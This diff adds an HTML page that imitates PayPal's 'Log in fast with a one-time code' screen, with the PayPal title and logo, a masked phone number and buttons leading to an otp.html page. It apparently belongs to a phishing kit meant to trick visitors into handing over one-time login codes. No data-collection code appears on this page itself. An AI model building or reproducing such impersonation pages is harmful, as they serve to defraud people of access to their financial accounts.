@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal</title>
+  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="static/styles/main.min.css">
+</head>
+<body>
+  <div class="main">
+    <section class="login">
+      <div class="container">
+        <img class="logo" src="static/images/logo.svg" alt="PayPal Logo" width="34px" height="40px">
+
+        <form action="" class="form">
+          <h2>Log in fast with a one-time code</h2>
+
+          <div class="form-input">
+            <p>Mobile (5XX) XXX-1251</p>
+          </div>
+
+          <button type="button" class="button primary" onClick="redirectTo('otp.html')">Get a code</button>
+          <button type="button" class="button secondary" onClick="redirectTo('index.html')">Please confirm a different way</button>
+
+          <div class="info-text">
+            <p>
+              By selecting “Get a Code,” you confirm you’re authorized to use this phone number and you agree to receive text messages. Carrier fees may apply.
+            </p>
+          </div>
+        </form>
+      </div>
+    </section>
+
+    <footer>
+      <!--a href="#" class="language-toggle">English</a> | <a href="#" class="language-toggle">Français</a-->
+    </footer>
+  </div>
+  <script>
+    function redirectTo(url) {
+      window.location.href = url;
+    }
+  </script>
+
+
+  <script src="static/scripts/jquery.min.js"></script>
+  <script src="static/scripts/main.js"></script>
+</body>
+</html>
